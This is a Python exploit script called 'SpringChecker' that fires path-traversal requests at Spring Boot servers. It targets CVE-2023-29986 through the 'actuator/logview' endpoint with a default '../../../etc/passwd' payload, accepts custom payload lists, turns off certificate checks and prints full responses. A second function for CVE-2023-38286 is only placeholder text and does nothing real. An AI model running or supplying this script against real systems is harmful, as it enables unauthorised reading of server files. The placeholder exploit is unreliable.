#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)

import requests
import argparse
from urllib.parse import urljoin

# Function to exploit CVE-2023-29986
def exploit_cve_2023_29986(target_url, proxies, payload_file=None):
    endpoint = "actuator/logview"
    default_payload = "../../../etc/passwd"
    payloads = [default_payload]
    if payload_file:
        with open(payload_file, 'r') as f:
            payloads = f.readlines()
    execute_exploit(target_url, endpoint, payloads, proxies)

# Function to exploit CVE-2023-38286
def exploit_cve_2023_38286(target_url, proxies, payload_file=None):
    endpoint = "some_endpoint_for_cve_2023_38286"  # Replace with actual endpoint
    default_payload = "some_default_payload"  # Replace with actual payload
    payloads = [default_payload]
    if payload_file:
        with open(payload_file, 'r') as f:
            payloads = f.readlines()
    execute_exploit(target_url, endpoint, payloads, proxies)

# Function to execute the exploit
def execute_exploit(target_url, endpoint, payloads, proxies):
    if not target_url.endswith('/'):
        target_url += '/'
    for payload in payloads:
        payload = payload.strip()
        full_url = urljoin(target_url, f"{endpoint}?file={payload}")
        try:
            response = requests.get(full_url, proxies=proxies, verify=False)
            display_response(response, payload)
        except Exception as e:
            print(f"An error occurred with payload {payload}: {e}")

# Function to display full HTTP response
def display_response(response, payload):
    print(f"Full HTTP Response for payload {payload}:\n")
    print(f"HTTP/1.1 {response.status_code} {response.reason}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print("\n")
    print(response.text)
    print("="*50)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SpringChecker: A tool for checking vulnerabilities in Spring Boot applications")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-p", "--proxy", help="Proxy URL (optional)")
    parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
    parser.add_argument("-c", "--cve", choices=['CVE-2023-29986', 'CVE-2023-38286'], help="CVE to exploit (optional)")
    
    args = parser.parse_args()
    proxies = {}
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    if args.cve:
        if args.cve == 'CVE-2023-29986':
            exploit_cve_2023_29986(args.target, proxies, args.payload_file)
        elif args.cve == 'CVE-2023-38286':
            exploit_cve_2023_38286(args.target, proxies, args.payload_file)
    else:
        print("Running all exploits...")
        exploit_cve_2023_29986(args.target, proxies, args.payload_file)
        exploit_cve_2023_38286(args.target, proxies, args.payload_file)
